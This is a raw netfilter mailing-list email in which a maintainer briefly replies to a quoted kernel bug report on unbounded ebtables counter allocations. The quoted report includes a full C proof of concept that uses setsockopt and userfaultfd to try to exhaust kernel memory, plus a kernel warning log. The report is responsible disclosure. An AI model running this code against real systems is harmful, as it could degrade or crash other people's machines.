Received: from mail-lj1-f178.google.com (mail-lj1-f178.google.com [209.85.208.178])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AE3451C3BF7
	for <netfilter-devel@vger.kernel.org>; Wed, 29 Jul 2026 04:44:50 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.208.178
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785300293; cv=pass; b=VcupI8C892MmtVsKRpMSnX8lAQN2M410ZJAQBrOECFVWcfqLz+yE3HOz28LVJACBDy84gwo4XxskJCisnp6DcTAHC3le2kzpszZeeJquM2tJm0e076fLzVV9oTdXNYFHbz4N1S7SwjrZ5nvUDIc//T8UYAzoqsvNA52y+Zx2XRw=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785300293; c=relaxed/simple;
	bh=DvzldrV41tM5vRJP3ooWinc8ixudGeEhGlrv0/BI0f4=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=K0o4DB87NBjkFR6Lh+2v07f6Rq7b9ImkS4rU2cLKPWaZnnLF5NVKWUZvlZiSVMDgzK3eutt+1GfgxTOZ2jdCR6xgCJjCy738O/vtWKj3a54XimhGaE7qBq9+qxx8+wiUTlzm+78ufPgLtT0+KzfjvPRte9POB30x11q0kvHgYHk=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=pwUT0CxD; arc=pass smtp.client-ip=209.85.208.178
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="pwUT0CxD"
Received: by mail-lj1-f178.google.com with SMTP id 38308e7fff4ca-39c94fccf3eso3590141fa.0
        for <netfilter-devel@vger.kernel.org>; Tue, 28 Jul 2026 21:44:50 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1785300289; cv=none;
        d=google.com; s=arc-20260327;
        b=nNvJ8fteAcCad86WuqiWKmS0fxmh+d1CEc/mkwGdEcbySrBSQtM8fjgF8MyRc6oqw8
         vjfFMNdtDCa/0XWSBUsXw2NKwwNPpoFya7m6eiaZco1OsOdAhJI0FWlO5a3xvOfYwMXV
         JMyU4m24RlP/ilk1BASrKyombti2uzAOMjqMpDwDz22OEF0E+C6AtZoQbffAd645E1Gz
         OuWuqQxDjGQrKd1i0x8baWDAlREpLpDyg0zeGVgaDTyPgVToTJB/hF7lv2oLqdTuo68V
         P8a/1iAvUFQ9RYDGAkWx1yGzETMVANap7yxuNEtw6eBduJGZ5653eRJIjl6G29sj8oUg
         zgLQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=PkVGIRIwAWV2OMKIaDQZJVlGPRS3RuzgiV56nbJx0I0=;
        fh=YrZj7z8sWFAZCGQ9R8dK709Op2SvqUlavQCAZG03dME=;
        b=hT6xtzP+rjytP/Befh4udwqynM0DgaYnKL2J1ILArUfN3H1Z9gB/dwqOv717LTqz1b
         jVzmXcT75+EQ2t0KI5M0TckdJAj4VV8+x+slhhVApCO2BCWoxiwBX9zbyBRVEbEFJaU6
         62zwaijMHbylTMjAaFFDwmR9TLvi9E/XeKt3aV9McZKC8vDdkEF8dXWQBsoCnuPcv+p4
         53XCB6yXwo1kmnNV35X2d6ry8LsilZRhgVNZhZ9m1uWZviRtSjqP6woZf8MLbERv8FdG
         s1PZslIo2Tm0YeycZK+Bc5LPxyYHLHlaWDLKRU/Lq7MReQnP0VLB6CEWWog6xY6/p8KI
         yTHQ==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785300289; x=1785905089; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=PkVGIRIwAWV2OMKIaDQZJVlGPRS3RuzgiV56nbJx0I0=;
        b=pwUT0CxDWoC1J+cDaKj7A4fw+EEsh24uofzbsHQrslnkFjyOWVTghNn5Uvs9Qwz1Fm
         oBl9cUypRp06VJfUEtuOyHm6jJ8+Z7eSpoHbwq+MMJeNm5OSX1xGOlA2p75VctbvItrn
         QZruDGhVLUsSI7Q9NIUKleiv8IMJenepQ8bVmvCUV1ZEQKHJU/WbbbSa+bD1fDGePSww
         3aJ3JpYGKhaOhh+OLwcBag/71/+5zKZgCiOF50Utx1NNsvPEIJhgGEFcgLao8pUPKiA7
         AAEYnmKHIBLz8OI3YQCeoHe7e1+gqRenNDBlpjYRxB8/C48CQ/bM+nchSzR65tfM6pTf
         zvfA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785300289; x=1785905089;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=PkVGIRIwAWV2OMKIaDQZJVlGPRS3RuzgiV56nbJx0I0=;
        b=CZQ5w3CDbf4WCP8B36boJiMT2fXYqOcoWQe5Izei/I4//p5IaF37V5klRuAgBOZHC8
         mfWAqav3NbX9IwUUqv9m9NSLSPhIowh+xHdYmE06lLYylg2AxKU/H8K8PhtbK77f7zZF
         P2Fq4yBOxijUptPzF9PA6M3dJprFR370qbiABArUhiw6NoPOBFZZ10/XrhKkUz8zLkC5
         pmJ5JdXhnABHHdA7JwbdV9zgQ9abynmbh+8BG1UC0S5Fj+voFFweW5c361sK7022K5ja
         qiDyYJEbIyKeG1A6MMxijMObm9OPmGbR+LHpag15knBY/gAvRFH75nOpLYVi5ff8VuuQ
         0uxw==
X-Forwarded-Encrypted: i=1; AHgh+RplhM75I/jDt7K3fywQPiUZnDkXx6Q09JjcAU65MUfHsiTlhajA4YW297Ug72yzUchF82GNzyoX2botUMXaz5c=@vger.kernel.org
X-Gm-Message-State: AOJu0YxQLchw5CRACJWUJoxqzI7GfI4ayyJ0nN8az0oRXya/qyojgL4i
	LfXOn4+MMX1AOxPF9+KQkZhMeoNZHc1QMK26JJKnQUJMhSLgRlI5FowxyP2H5CCjrBHEhDh9KJx
	T88QZA6nQ4mTzZCzkK32Sh4wLQ3NbhiH7kgjq4ohfBJwFYf/463lobg/BynIE4mgN
X-Gm-Gg: AR+sD11c9dxocfKXjNJoinTplBmxzYuVke2ANEYLX65szsF1xt8Sc/vxvSJrnw9mgu7
	iIwwRWutXAM65kDGt8Bnxj1yM3UcnNDiouCPICPizarNA8vKo8N/0hO92LyggwvkIvES//A1jhl
	VsIngBSliIuX46RR9v5xRT4jP16X/14JIi9K4PY46+UZzSUpQLkPb4+OQ19HtWqbnmeTqQipmz9
	edill4cZgjkKhYHJcQXFJ17ykHj3XD+YeiQ76THwqDO5J4h86Sa6J3c22ga+fcerx6FJMqfWOw/
	GdGdrvh9bC2f45/+WxKnjuSmqfDygFXzog/wT5rydBg=
X-Received: by 2002:a2e:bc1d:0:b0:39b:d04:b778 with SMTP id
 38308e7fff4ca-39f51cdefd1mr9403741fa.5.1785300288185; Tue, 28 Jul 2026
 21:44:48 -0700 (PDT)
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <cover.1785131981.git.zihanx@nebusec.ai> <amkEmMRrTkx3YU1t@chamomile>
In-Reply-To: <amkEmMRrTkx3YU1t@chamomile>
From: zihan xi <zihanx@nebusec.ai>
Date: Wed, 29 Jul 2026 12:44:37 +0800
X-Gm-Features: AUfX_mzvl1J7PkbSX7eip61CAFMkY9XQHOJdVEKZeiYscXReT-N5upk6iDSV4K8
Message-ID: <CAANe3eQgQ1cELKRhFmnu46JN-CzWJo_JwiqZ4apeRNo6vvj3Lw@mail.gmail.com>
Subject: Re: [PATCH nf 0/1] netfilter: ebtables: avoid unbounded counter allocations
To: Pablo Neira Ayuso <pablo@netfilter.org>
Cc: Ren Wei <enjou1224z@gmail.com>, netfilter-devel@vger.kernel.org, 
	bridge@lists.linux.dev, fw@strlen.de, phil@nwl.cc, razor@blackwall.org, 
	idosch@nvidia.com, vega@nebusec.ai
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Wed, Jul 29, 2026 at 3:35=E2=80=AFAM Pablo Neira Ayuso <pablo@netfilter.=
org> wrote:
>
> Hi,
>
> On Tue, Jul 28, 2026 at 02:09:43AM +0800, Ren Wei wrote:
> > From: Zihan Xi <zihanx@nebusec.ai>
> >
> > Hi Linux kernel maintainers,
> >
> > We found and validated a issue in net/bridge/netfilter/ebtables.c. The =
bug is reachable by a
> > non-root user via user and net namespace.
> > We've tested it, and it should not affect any other functionality.
> >
> > We will provide detailed information about the bug
> > in this email, along with a PoC to trigger it.
> >
> > ---- details below ----
> >
> > Bug details:
> >
> > EBT_SO_SET_COUNTERS copies only a fixed struct ebt_replace header befor=
e it
> > allocates a temporary counter array. The user-controlled num_counters f=
ield is
> > used for that allocation before the target table is looked up and befor=
e it can
> > be compared with the table's real nentries value. A user with CAP_NET_A=
DMIN in
> > a user/net namespace can therefore request a very large allocation agai=
nst any
> > table name, even a non-existent one.
>
> You could just create a very large well-formed table with ebtables too?
>
> This is not a crash, just a very large allocation.
>
> [    1.577403] poc: vmalloc error: size 2147483520, exceeds total pages, =
mode:0xcc0(GFP_KERNEL), nodemask=3D(null),cpuset=3D/,mems_allowed=3D0
>
> > EBT_SO_SET_ENTRIES has the same root cause in do_replace_finish(). Afte=
r the
> > replacement blob is copied and validated, do_replace_finish() used
> > repl->num_counters to allocate counterstmp before find_table_lock() and=
 before
> > checking it against t->private->nentries. That path can trigger the sam=
e
> > unbounded allocation before the kernel knows whether the table exists o=
r how
> > many counters are valid for it.
> >
> > Recent public patches on July 2, 2026 and July 4, 2026 also tightened
> > bounds for do_replace()/do_replace_finish() and do_update_counters()
> > individually, but the underlying issue is the same in both paths:
> > temporary counter arrays are allocated from user-controlled counts befo=
re
> > the kernel has resolved the real table and validated the real nentries
> > value.
> >
> > Fix this by moving both temporary counter allocations after find_table_=
lock()
> > and after the num_counters-to-nentries validation. Invalid table names =
or
> > counter counts now fail with the existing semantic errors instead of fi=
rst
> > attempting a large allocation. This is a setsockopt control-plane trigg=
er, not
> > a packet-driven protocol-state trigger, so packetdrill cannot express t=
he key
> > EBT_SO_SET_COUNTERS/EBT_SO_SET_ENTRIES inputs; the reproducer uses sets=
ockopt()
> > directly.
> >
> > Reproducer:
> >
> >     gcc -O2 -static -o poc poc.c
> >     unshare -Urn ./poc
> >
> > We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
> >
> > ------BEGIN poc.c------
> > #define _GNU_SOURCE
> >
> > #include <errno.h>
> > #include <fcntl.h>
> > #include <inttypes.h>
> > #include <poll.h>
> > #include <pthread.h>
> > #include <signal.h>
> > #include <stdbool.h>
> > #include <stdint.h>
> > #include <stdio.h>
> > #include <stdlib.h>
> > #include <string.h>
> > #include <sys/ioctl.h>
> > #include <sys/mman.h>
> > #include <sys/socket.h>
> > #include <sys/syscall.h>
> > #include <sys/types.h>
> > #include <sys/wait.h>
> > #include <unistd.h>
> >
> > #include <linux/userfaultfd.h>
> >
> > #ifndef O_CLOEXEC
> > #define O_CLOEXEC 02000000
> > #endif
> >
> > #define SOL_IP 0
> >
> > #define EBT_TABLE_MAXNAMELEN 32
> > #define EBT_BASE_CTL 128
> > #define EBT_SO_SET_ENTRIES (EBT_BASE_CTL)
> > #define EBT_SO_SET_COUNTERS (EBT_SO_SET_ENTRIES + 1)
> > #define EBT_SO_GET_INFO (EBT_BASE_CTL)
> > #define EBT_SO_GET_ENTRIES (EBT_SO_GET_INFO + 1)
> >
> > #define NF_BR_NUMHOOKS 6
> >
> > struct ebt_counter {
> >       uint64_t pcnt;
> >       uint64_t bcnt;
> > };
> >
> > struct ebt_replace {
> >       char name[EBT_TABLE_MAXNAMELEN];
> >       unsigned int valid_hooks;
> >       unsigned int nentries;
> >       unsigned int entries_size;
> >       void *hook_entry[NF_BR_NUMHOOKS];
> >       unsigned int num_counters;
> >       struct ebt_counter *counters;
> >       char *entries;
> > };
> >
> > #define HUGE_NUM_COUNTERS 134217720U
> > #define HUGE_COUNTERS_LEN ((unsigned int)(sizeof(struct ebt_replace) + =
\
> >                                         HUGE_NUM_COUNTERS * sizeof(stru=
ct ebt_counter)))
> > #define TINY_ENTRIES_SIZE 1U
> > #define HUGE_REPLACE_LEN ((unsigned int)(sizeof(struct ebt_replace) + \
> >                                        TINY_ENTRIES_SIZE))
> >
> > _Static_assert(sizeof(struct ebt_replace) =3D=3D 120, "unexpected ebt_r=
eplace size");
> > _Static_assert(HUGE_COUNTERS_LEN =3D=3D 2147483640U,
> >              "unexpected huge setsockopt length");
> >
> > struct table_info {
> >       unsigned int nentries;
> >       unsigned int entries_size;
> >       unsigned int valid_hooks;
> > };
> >
> > struct blocker_state {
> >       int uffd;
> >       long page_size;
> >       void *fault_page;
> >       char *copy_page;
> >       volatile sig_atomic_t release_fault;
> >       volatile sig_atomic_t fault_seen;
> >       volatile sig_atomic_t blocker_started;
> >       struct ebt_replace *req;
> >       socklen_t optlen;
> >       int blocker_ret;
> >       int blocker_errno;
> > };
> >
> > static void fatal(const char *what)
> > {
> >       perror(what);
> >       exit(EXIT_FAILURE);
> > }
> >
> > static int make_inet_socket(void)
> > {
> >       int fd =3D socket(AF_INET, SOCK_STREAM, 0);
> >
> >       if (fd < 0)
> >               fatal("socket(AF_INET, SOCK_STREAM)");
> >       return fd;
> > }
> >
> > static void get_table_info(const char *name, struct table_info *info)
> > {
> >       struct ebt_replace req;
> >       socklen_t len =3D sizeof(req);
> >       int fd =3D make_inet_socket();
> >
> >       memset(&req, 0, sizeof(req));
> >       snprintf(req.name, sizeof(req.name), "%s", name);
> >
> >       if (getsockopt(fd, SOL_IP, EBT_SO_GET_INFO, &req, &len) !=3D 0)
> >               fatal("getsockopt(EBT_SO_GET_INFO)");
> >
> >       close(fd);
> >
> >       info->nentries =3D req.nentries;
> >       info->entries_size =3D req.entries_size;
> >       info->valid_hooks =3D req.valid_hooks;
> > }
> >
> > static int do_huge_update(const char *name, bool log_result)
> > {
> >       struct ebt_replace req;
> >       int fd =3D make_inet_socket();
> >       int saved_errno;
> >       int ret;
> >
> >       memset(&req, 0, sizeof(req));
> >       snprintf(req.name, sizeof(req.name), "%s", name);
> >       req.num_counters =3D HUGE_NUM_COUNTERS;
> >       req.counters =3D (struct ebt_counter *)0x10000;
> >
> >       errno =3D 0;
> >       ret =3D setsockopt(fd, SOL_IP, EBT_SO_SET_COUNTERS, &req,
> >                        HUGE_COUNTERS_LEN);
> >       saved_errno =3D errno;
> >       close(fd);
> >
> >       if (log_result)
> >               fprintf(stderr,
> >                       "[worker] SET_COUNTERS name=3D%s len=3D%u num_cou=
nters=3D%u -> ret=3D%d errno=3D%d (%s)\n",
> >                       name, HUGE_COUNTERS_LEN, HUGE_NUM_COUNTERS, ret,
> >                       saved_errno, strerror(saved_errno));
> >
> >       errno =3D saved_errno;
> >       return ret;
> > }
> >
> > static int do_huge_replace(const char *name, bool log_result)
> > {
> >       struct ebt_replace req;
> >       char tiny_entries[TINY_ENTRIES_SIZE] =3D {0};
> >       int fd =3D make_inet_socket();
> >       int saved_errno;
> >       int ret;
> >
> >       memset(&req, 0, sizeof(req));
> >       snprintf(req.name, sizeof(req.name), "%s", name);
> >       req.entries_size =3D TINY_ENTRIES_SIZE;
> >       req.entries =3D tiny_entries;
> >       req.num_counters =3D HUGE_NUM_COUNTERS;
> >       req.counters =3D (struct ebt_counter *)0x10000;
> >
> >       errno =3D 0;
> >       ret =3D setsockopt(fd, SOL_IP, EBT_SO_SET_ENTRIES, &req,
> >                        HUGE_REPLACE_LEN);
> >       saved_errno =3D errno;
> >       close(fd);
> >
> >       if (log_result)
> >               fprintf(stderr,
> >                       "[worker] SET_ENTRIES name=3D%s len=3D%u entries_=
size=3D%u num_counters=3D%u allocation=3D%zu -> ret=3D%d errno=3D%d (%s)\n"=
,
> >                       name, HUGE_REPLACE_LEN, TINY_ENTRIES_SIZE,
> >                       HUGE_NUM_COUNTERS,
> >                       (size_t)HUGE_NUM_COUNTERS * sizeof(struct ebt_cou=
nter),
> >                       ret, saved_errno, strerror(saved_errno));
> >
> >       errno =3D saved_errno;
> >       return ret;
> > }
> >
> > static int open_userfaultfd(void)
> > {
> >       struct uffdio_api api;
> >       int fd;
> >
> >       fd =3D syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
> >       if (fd < 0) {
> >               fd =3D open("/dev/userfaultfd", O_RDWR | O_CLOEXEC | O_NO=
NBLOCK);
> >               if (fd < 0)
> >                       fatal("userfaultfd/open(/dev/userfaultfd)");
> >               fd =3D ioctl(fd, USERFAULTFD_IOC_NEW, O_CLOEXEC | O_NONBL=
OCK);
> >               if (fd < 0)
> >                       fatal("USERFAULTFD_IOC_NEW");
> >       }
> >
> >       memset(&api, 0, sizeof(api));
> >       api.api =3D UFFD_API;
> >       if (ioctl(fd, UFFDIO_API, &api) < 0)
> >               fatal("UFFDIO_API");
> >
> >       return fd;
> > }
> >
> > static void register_missing_page(struct blocker_state *st)
> > {
> >       struct uffdio_register reg;
> >
> >       st->fault_page =3D mmap(NULL, st->page_size, PROT_READ | PROT_WRI=
TE,
> >                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
> >       if (st->fault_page =3D=3D MAP_FAILED)
> >               fatal("mmap(fault_page)");
> >       if (munmap(st->fault_page, st->page_size) !=3D 0)
> >               fatal("munmap(fault_page)");
> >
> >       st->copy_page =3D calloc(1, (size_t)st->page_size);
> >       if (!st->copy_page)
> >               fatal("calloc(copy_page)");
> >
> >       memset(&reg, 0, sizeof(reg));
> >       reg.range.start =3D (unsigned long)st->fault_page;
> >       reg.range.len =3D (unsigned long)st->page_size;
> >       reg.mode =3D UFFDIO_REGISTER_MODE_MISSING;
> >       if (ioctl(st->uffd, UFFDIO_REGISTER, &reg) !=3D 0)
> >               fatal("UFFDIO_REGISTER");
> > }
> >
> > static void *uffd_handler_thread(void *arg)
> > {
> >       struct blocker_state *st =3D arg;
> >
> >       while (!st->release_fault) {
> >               struct uffd_msg msg;
> >               struct pollfd pfd =3D { .fd =3D st->uffd, .events =3D POL=
LIN };
> >               int pr =3D poll(&pfd, 1, 100);
> >
> >               if (pr < 0) {
> >                       if (errno =3D=3D EINTR)
> >                               continue;
> >                       fatal("poll(userfaultfd)");
> >               }
> >               if (pr =3D=3D 0)
> >                       continue;
> >               if (read(st->uffd, &msg, sizeof(msg)) !=3D sizeof(msg))
> >                       fatal("read(userfaultfd)");
> >               if (msg.event !=3D UFFD_EVENT_PAGEFAULT)
> >                       continue;
> >
> >               st->fault_seen =3D 1;
> >               fprintf(stderr,
> >                       "[blocker] userfaultfd trapped kernel copy_to_use=
r at address 0x%llx\n",
> >                       (unsigned long long)msg.arg.pagefault.address);
> >
> >               while (!st->release_fault)
> >                       usleep(10000);
> >
> >               struct uffdio_copy copy;
> >               memset(&copy, 0, sizeof(copy));
> >               copy.src =3D (unsigned long)st->copy_page;
> >               copy.dst =3D (unsigned long)st->fault_page;
> >               copy.len =3D (unsigned long)st->page_size;
> >               if (ioctl(st->uffd, UFFDIO_COPY, &copy) !=3D 0)
> >                       fatal("UFFDIO_COPY");
> >               fprintf(stderr, "[blocker] released the trapped GET_ENTRI=
ES fault\n");
> >               break;
> >       }
> >
> >       return NULL;
> > }
> >
> > static void *blocker_thread(void *arg)
> > {
> >       struct blocker_state *st =3D arg;
> >       int fd =3D make_inet_socket();
> >
> >       st->blocker_started =3D 1;
> >       errno =3D 0;
> >       st->blocker_ret =3D getsockopt(fd, SOL_IP, EBT_SO_GET_ENTRIES,
> >                                      st->req, &st->optlen);
> >       st->blocker_errno =3D errno;
> >       fprintf(stderr,
> >               "[blocker] getsockopt(EBT_SO_GET_ENTRIES) returned ret=3D=
%d errno=3D%d (%s)\n",
> >               st->blocker_ret, st->blocker_errno, strerror(st->blocker_=
errno));
> >       close(fd);
> >       return NULL;
> > }
> >
> > static uint64_t read_meminfo_kb(const char *key)
> > {
> >       char name[128];
> >       uint64_t value;
> >       FILE *f =3D fopen("/proc/meminfo", "r");
> >
> >       if (!f)
> >               fatal("fopen(/proc/meminfo)");
> >       while (fscanf(f, "%127s %" SCNu64 " kB", name, &value) =3D=3D 2) =
{
> >               name[strcspn(name, ":")] =3D '\0';
> >               if (strcmp(name, key) =3D=3D 0) {
> >                       fclose(f);
> >                       return value;
> >               }
> >       }
> >       fclose(f);
> >       fatal("read_meminfo_kb");
> >       return 0;
> > }
> >
> > static void kill_children(pid_t *children, int n)
> > {
> >       int i;
> >
> >       for (i =3D 0; i < n; i++)
> >               if (children[i] > 0)
> >                       kill(children[i], SIGKILL);
> > }
> >
> > static void reap_children(pid_t *children, int n)
> > {
> >       int i;
> >
> >       for (i =3D 0; i < n; i++)
> >               if (children[i] > 0)
> >                       waitpid(children[i], NULL, 0);
> > }
> >
> > static void run_oom_mode(int workers, int timeout_sec)
> > {
> >       struct blocker_state st;
> >       struct table_info filter;
> >       pthread_t blocker_tid;
> >       pthread_t uffd_tid;
> >       pid_t *children;
> >       uint64_t mem_before, mem_after;
> >       int i;
> >
> >       if (workers <=3D 0)
> >               fatal("workers must be positive");
> >
> >       memset(&st, 0, sizeof(st));
> >       get_table_info("filter", &filter);
> >
> >       fprintf(stderr,
> >               "[setup] filter table: nentries=3D%u entries_size=3D%u va=
lid_hooks=3D0x%x\n",
> >               filter.nentries, filter.entries_size, filter.valid_hooks)=
;
> >       fprintf(stderr,
> >               "[setup] huge update request: len=3D%u num_counters=3D%u =
allocation=3D%zu bytes\n",
> >               HUGE_COUNTERS_LEN, HUGE_NUM_COUNTERS,
> >               (size_t)HUGE_NUM_COUNTERS * sizeof(struct ebt_counter));
> >
> >       st.page_size =3D sysconf(_SC_PAGESIZE);
> >       if (st.page_size <=3D 0)
> >               fatal("sysconf(_SC_PAGESIZE)");
> >
> >       st.uffd =3D open_userfaultfd();
> >       register_missing_page(&st);
> >
> >       st.req =3D calloc(1, sizeof(*st.req));
> >       if (!st.req)
> >               fatal("calloc(blocker request)");
> >
> >       snprintf(st.req->name, sizeof(st.req->name), "%s", "filter");
> >       st.req->nentries =3D filter.nentries;
> >       st.req->entries_size =3D filter.entries_size;
> >       st.req->num_counters =3D 0;
> >       st.req->entries =3D st.fault_page;
> >       st.optlen =3D sizeof(*st.req) + filter.entries_size;
> >
> >       if (pthread_create(&uffd_tid, NULL, uffd_handler_thread, &st) !=
=3D 0)
> >               fatal("pthread_create(uffd)");
> >       if (pthread_create(&blocker_tid, NULL, blocker_thread, &st) !=3D =
0)
> >               fatal("pthread_create(blocker)");
> >
> >       for (i =3D 0; i < timeout_sec * 100; i++) {
> >               if (st.fault_seen)
> >                       break;
> >               usleep(10000);
> >       }
> >       if (!st.fault_seen) {
> >               fprintf(stderr,
> >                       "[setup] blocker did not hit the userfaultfd trap=
 within %d seconds\n",
> >                       timeout_sec);
> >               st.release_fault =3D 1;
> >               pthread_join(blocker_tid, NULL);
> >               pthread_join(uffd_tid, NULL);
> >               exit(EXIT_FAILURE);
> >       }
> >
> >       mem_before =3D read_meminfo_kb("MemAvailable");
> >       fprintf(stderr, "[state] MemAvailable before workers: %" PRIu64 "=
 kB\n",
> >               mem_before);
> >
> >       children =3D calloc((size_t)workers, sizeof(*children));
> >       if (!children)
> >               fatal("calloc(children)");
> >
> >       for (i =3D 0; i < workers; i++) {
> >               pid_t pid =3D fork();
> >
> >               if (pid < 0)
> >                       fatal("fork");
> >               if (pid =3D=3D 0) {
> >                       do_huge_update("bogus", true);
> >                       _exit(EXIT_SUCCESS);
> >               }
> >               children[i] =3D pid;
> >               fprintf(stderr, "[parent] spawned worker pid=3D%d\n", pid=
);
> >       }
> >
> >       sleep(2);
> >       mem_after =3D read_meminfo_kb("MemAvailable");
> >       fprintf(stderr,
> >               "[state] MemAvailable after workers: %" PRIu64 " kB (delt=
a=3D%" PRIi64 " kB)\n",
> >               mem_after, (int64_t)mem_after - (int64_t)mem_before);
> >       fprintf(stderr, "[state] waiting up to %d seconds for an OOM-indu=
ced crash\n",
> >               timeout_sec);
> >
> >       sleep(timeout_sec);
> >
> >       fprintf(stderr, "[cleanup] timeout expired without a kernel panic=
; releasing blocker\n");
> >       st.release_fault =3D 1;
> >       pthread_join(blocker_tid, NULL);
> >       pthread_join(uffd_tid, NULL);
> >       kill_children(children, workers);
> >       reap_children(children, workers);
> >       free(children);
> > }
> >
> > static void usage(const char *prog)
> > {
> >       fprintf(stderr,
> >               "Usage:\n"
> >               "  %s counters [table]\n"
> >               "  %s replace [table]\n"
> >               "  %s oom [workers] [timeout_sec]\n",
> >               prog, prog, prog);
> > }
> >
> > int main(int argc, char **argv)
> > {
> >       if (argc < 2) {
> >               do_huge_update("bogus", true);
> >               do_huge_replace("bogus", true);
> >               return EXIT_FAILURE;
> >       }
> >
> >       if (strcmp(argv[1], "counters") =3D=3D 0) {
> >               const char *name =3D (argc >=3D 3) ? argv[2] : "bogus";
> >               int ret =3D do_huge_update(name, true);
> >
> >               return (ret =3D=3D 0) ? EXIT_SUCCESS : EXIT_FAILURE;
> >       }
> >
> >       if (strcmp(argv[1], "replace") =3D=3D 0) {
> >               const char *name =3D (argc >=3D 3) ? argv[2] : "bogus";
> >               int ret =3D do_huge_replace(name, true);
> >
> >               return (ret =3D=3D 0) ? EXIT_SUCCESS : EXIT_FAILURE;
> >       }
> >
> >       if (strcmp(argv[1], "oom") =3D=3D 0) {
> >               int workers =3D (argc >=3D 3) ? atoi(argv[2]) : 3;
> >               int timeout_sec =3D (argc >=3D 4) ? atoi(argv[3]) : 10;
> >
> >               run_oom_mode(workers, timeout_sec);
> >               return EXIT_SUCCESS;
> >       }
> >
> >       usage(argv[0]);
> >       return EXIT_FAILURE;
> > }
> > ------END poc.c--------
> >
> > ----BEGIN crash log----
> > EBT_SO_SET_COUNTERS path:
> > [    1.577403] poc: vmalloc error: size 2147483520, exceeds total pages=
, mode:0xcc0(GFP_KERNEL), nodemask=3D(null),cpuset=3D/,mems_allowed=3D0
> > [    1.578954] CPU: 1 UID: 0 PID: 64 Comm: poc Not tainted 7.2.0-rc4-00=
390-g743916aa8e8c #4 PREEMPT(lazy)
> > [    1.579038] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, a=
rch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
> > [    1.579145] Call Trace:
> > [    1.579555]  <TASK>
> > [    1.579713]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:12=
0)
> > [    1.579934]  warn_alloc (mm/page_alloc.c:4023)
> > [    1.579949]  __vmalloc_node_range_noprof (mm/vmalloc.c:4019)
> > [    1.579960]  ? folio_add_file_rmap_ptes (include/linux/vmstat.h:542 =
(discriminator 1) mm/rmap.c:1336 (discriminator 1) mm/rmap.c:1428 (discrimi=
nator 1) mm/rmap.c:1706 (discriminator 1) mm/rmap.c:1732 (discriminator 1))
> > [    1.579969]  ? do_update_counters.constprop.0 (net/bridge/netfilter/=
ebtables.c:1395 (discriminator 2))
> > [    1.579977]  ? filemap_map_pages (include/linux/rcupdate.h:873 mm/fi=
lemap.c:3984)
> > [    1.579992]  __vmalloc_node_noprof (mm/vmalloc.c:4143 (discriminator=
 4))
> > [    1.580006]  ? do_update_counters.constprop.0 (net/bridge/netfilter/=
ebtables.c:1395 (discriminator 2))
> > [    1.580011]  do_update_counters.constprop.0 (net/bridge/netfilter/eb=
tables.c:1395 (discriminator 2))
> > [    1.580020]  update_counters (net/bridge/netfilter/ebtables.c:1444)
> > [    1.580030]  nf_setsockopt (net/netfilter/nf_sockopt.c:101)
> > [    1.580052]  do_sock_setsockopt (net/socket.c:2368)
> > [    1.580066]  __sys_setsockopt (net/socket.c:2393)
> > [    1.580075]  __x64_sys_setsockopt (net/socket.c:2399 net/socket.c:23=
96 net/socket.c:2396)
> > [    1.580082]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/=
entry/syscall_64.c:94)
> > [    1.580090]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64=
.S:121)
> > [    1.580208] RIP: 0033:0x43523e
> > [    1.580370] Code: ff ff ff f7 d8 64 89 02 b8 ff ff ff ff c3 66 2e 0f=
 1f 84 00 00 00 00 00 0f 1f 40 00 f3 0f 1e fa 49 89 ca b8 36 00 00 00 0f 05=
 <48> 3d 00 f0 ff ff 77 0a c3 66 0f 1f 84 00 00 00 00 00 48 c7 c2 b8
> > [    1.580416] RSP: 002b:00007ffd9e4c8f48 EFLAGS: 00000246 ORIG_RAX: 00=
00000000000036
